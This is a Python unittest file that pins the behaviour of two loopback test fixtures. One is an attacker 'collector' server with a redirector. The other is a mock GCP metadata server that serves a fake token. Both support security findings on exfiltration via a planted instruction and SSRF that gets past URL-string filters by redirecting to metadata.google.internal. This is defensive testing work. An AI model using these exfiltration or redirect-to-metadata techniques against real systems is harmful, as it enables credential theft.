"""Contract tests for the two M2 hostile fixtures.

    python3 -m unittest discover -s fixtures -t fixtures -p 'test_*.py' -v

stdlib unittest, loopback only. These pin the FIXTURE CONTRACTS T7's
exploits depend on (plan, T6: "settle here, not at T7"):

    collector      records every request and echoes it back; GET
                   /received returns what arrived -- finding 03's
                   evidence IS "the attacker received these bytes"
    mock-metadata  serves a fake SA credential at the real GCP path,
                   and a 302 variant (B7 1.2) whose Location the PoC
                   prints
    collector      ALSO serves /redirect -- an attacker-controlled
                   redirector whose first URL names no metadata host at
                   all. That, not mock-metadata's own 302, is what makes
                   04 more than a string-match demo: a filter matching
                   "metadata" or "169.254" on the requested URL passes
                   it, and only a fetcher that re-evaluates every hop
                   (SR-B7-1) stops it.
"""

from __future__ import annotations

import http.client
import json
import sys
import threading
import unittest
from pathlib import Path
from urllib.parse import quote

sys.path.insert(0, str(Path(__file__).resolve().parent))

import collector  # noqa: E402
import mock_metadata  # noqa: E402

TOKEN_PATH = mock_metadata.TOKEN_PATH


class _Served:
    """Run a fixture's server on an ephemeral loopback port."""

    def __init__(self, make_server):
        self.server = make_server("127.0.0.1", 0)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def request(self, method, path, body=None, headers=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        try:
            conn.request(method, path, body=body, headers=headers or {})
            resp = conn.getresponse()
            return resp.status, dict(resp.getheaders()), resp.read().decode("utf-8")
        finally:
            conn.close()

    def close(self):
        self.server.shutdown()
        self.server.server_close()


class Collector(unittest.TestCase):
    def setUp(self):
        self.srv = _Served(collector.make_server)
        self.addCleanup(self.srv.close)

    def received(self):
        status, _, body = self.srv.request("GET", "/received")
        self.assertEqual(status, 200)
        return json.loads(body)["received"]

    def test_exfil_query_string_is_recorded_verbatim_and_decoded(self):
        # The shape finding 03's planted instruction produces: tenant
        # bytes URL-encoded into a query parameter.
        payload = "Acme Q3 revenue: $4.2M"
        status, _, _ = self.srv.request("GET", "/collect?data=" + quote(payload))
        self.assertEqual(status, 200)
        [got] = self.received()
        self.assertEqual(got["method"], "GET")
        self.assertEqual(got["path"], "/collect")
        self.assertEqual(got["query"], "data=" + quote(payload))
        # Decoded too, so the PoC can assert on the tenant's bytes as
        # they were in the document rather than re-encoding them.
        self.assertEqual(got["params"], {"data": [payload]})

    def test_the_response_echoes_what_was_received(self):
        _, _, body = self.srv.request("GET", "/collect?data=abc")
        self.assertIn("/collect?data=abc", body)

    def test_post_bodies_are_recorded(self):
        self.srv.request("POST", "/collect", body=b"secret-bytes",
                         headers={"Content-Type": "text/plain"})
        [got] = self.received()
        self.assertEqual((got["method"], got["body"]), ("POST", "secret-bytes"))

    def test_reading_received_is_not_itself_recorded(self):
        self.received()
        self.received()
        self.assertEqual(self.received(), [])

    def test_reset_clears_the_record(self):
        # Isolation between PoC runs: a receipt from a previous run must
        # not satisfy this run's assertion.
        self.srv.request("GET", "/collect?data=old")
        status, _, _ = self.srv.request("DELETE", "/received")
        self.assertEqual(status, 204)
        self.assertEqual(self.received(), [])

    def test_the_record_is_bounded(self):
        # A small cap, injected: the bound is the property, not the
        # production number, and 1000 real requests make a slow test.
        small = _Served(lambda h, p: collector.make_server(h, p, max_records=3))
        self.addCleanup(small.close)
        for i in range(5):
            small.request("GET", f"/c?i={i}")
        _, _, body = small.request("GET", "/received")
        got = json.loads(body)["received"]
        # Oldest dropped, newest kept.
        self.assertEqual([r["query"] for r in got], ["i=2", "i=3", "i=4"])

    def test_production_cap_is_finite(self):
        self.assertGreater(collector.MAX_RECORDS, 0)


class CollectorRedirect(unittest.TestCase):
    """The attacker's redirector (B7 1.2), for finding 04's 302 variant."""

    def setUp(self):
        self.srv = _Served(collector.make_server)
        self.addCleanup(self.srv.close)

    def test_redirect_defaults_to_the_metadata_token(self):
        status, headers, _ = self.srv.request("GET", "/redirect")
        self.assertEqual(status, 302)
        self.assertEqual(headers["Location"],
                         "http://metadata.google.internal" + TOKEN_PATH)

    def test_the_first_url_names_no_metadata_host(self):
        # The point of the redirector: nothing a string filter on the
        # REQUESTED url could match. Pinned so a refactor that moves the
        # target into the path cannot quietly turn 04 back into a
        # string-match demo.
        for needle in ("metadata", "169.254", "computeMetadata"):
            self.assertNotIn(needle, collector.REDIRECT_PATH)

    def test_redirect_target_is_settable(self):
        target = "http://metadata.google.internal/computeMetadata/v1/"
        status, headers, _ = self.srv.request("GET", "/redirect?to=" + quote(target, safe=""))
        self.assertEqual((status, headers["Location"]), (302, target))

    def test_the_redirect_hit_is_recorded(self):
        # The attacker sees the victim arrive, even though the payoff is
        # elsewhere -- part of the evidence trail.
        self.srv.request("GET", "/redirect")
        _, _, body = self.srv.request("GET", "/received")
        [got] = json.loads(body)["received"]
        self.assertEqual(got["path"], "/redirect")


class MockMetadata(unittest.TestCase):
    def setUp(self):
        self.srv = _Served(mock_metadata.make_server)
        self.addCleanup(self.srv.close)

    def test_serves_a_fake_sa_token_at_the_real_gcp_path(self):
        status, headers, body = self.srv.request("GET", TOKEN_PATH)
        self.assertEqual(status, 200)
        token = json.loads(body)
        self.assertEqual(token["token_type"], "Bearer")
        self.assertIn("access_token", token)
        # Unmistakably fake: nothing a reader could mistake for, or a
        # scanner could flag as, a live credential.
        self.assertIn("FAKE", token["access_token"])
        self.assertEqual(headers.get("Metadata-Flavor"), "Google")

    def test_does_not_require_the_metadata_flavor_header(self):
        # DECLARED DEPARTURE from real GCP, which refuses requests without
        # `Metadata-Flavor: Google` -- a genuine SSRF mitigation. M2's
        # http_fetch takes a URL only (no header control), so finding 04
        # models an endpoint without that guard. Pinned here so the
        # departure is a tested decision, not an accident.
        status, _, _ = self.srv.request("GET", TOKEN_PATH)
        self.assertEqual(status, 200)

    def test_redirect_variant_defaults_to_the_token(self):
        status, headers, _ = self.srv.request("GET", "/redirect")
        self.assertEqual(status, 302)
        self.assertEqual(headers["Location"],
                         "http://metadata.google.internal" + TOKEN_PATH)

    def test_redirect_target_is_settable(self):
        target = "http://attacker.example/landing"
        status, headers, _ = self.srv.request("GET", "/redirect?to=" + quote(target, safe=""))
        self.assertEqual(status, 302)
        self.assertEqual(headers["Location"], target)

    def test_unknown_paths_are_404(self):
        status, _, _ = self.srv.request("GET", "/nope")
        self.assertEqual(status, 404)


if __name__ == "__main__":
    unittest.main()
